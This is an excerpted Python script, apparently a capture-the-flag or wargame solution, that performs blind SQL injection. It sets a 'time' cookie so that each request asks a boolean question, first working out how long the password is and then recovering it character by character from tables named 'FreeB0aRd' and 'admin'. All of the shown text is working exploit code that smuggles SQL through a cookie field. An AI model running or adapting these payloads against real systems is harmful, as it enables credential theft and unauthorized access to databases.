...
for i in range(1,20):
    headers = {
	    "Cookie": "time=1534861794 and (select length(password) from FreeB0aRd) = %d; PHPSESSID=37edff1c7fc88953c447ed5f80020480" % i
    }
    try:
        print "Try: %d" % i 
...
for i in range(1,FreeB0aRd_pw_length+1):
    for j in range(0x21,0x7f):
        ...
        headers = {
	        "Cookie": "time=1534861794 and ascii((select substr(password,%d,1) from FreeB0aRd)) = %d; PHPSESSID=37edff1c7fc88953c447ed5f80020480" % (i,j)
        }
...
for i in range(1,20):
    headers = {
	    "Cookie": "time=1534861794 and (select length(password) from admin) = %d; PHPSESSID=37edff1c7fc88953c447ed5f80020480" % i
    }
    try:
        print "Try: %d" % i 
        res = requests.get(url, headers=headers)
...
for i in range(1,admin_pw_length+1):
    for j in range(0x21,0x7f):
        ...
        headers = {
	        "Cookie": "time=1534861794 and ascii((select substr(password,%d,1) from admin)) = %d; PHPSESSID=37edff1c7fc88953c447ed5f80020480" % (i,j)
        }
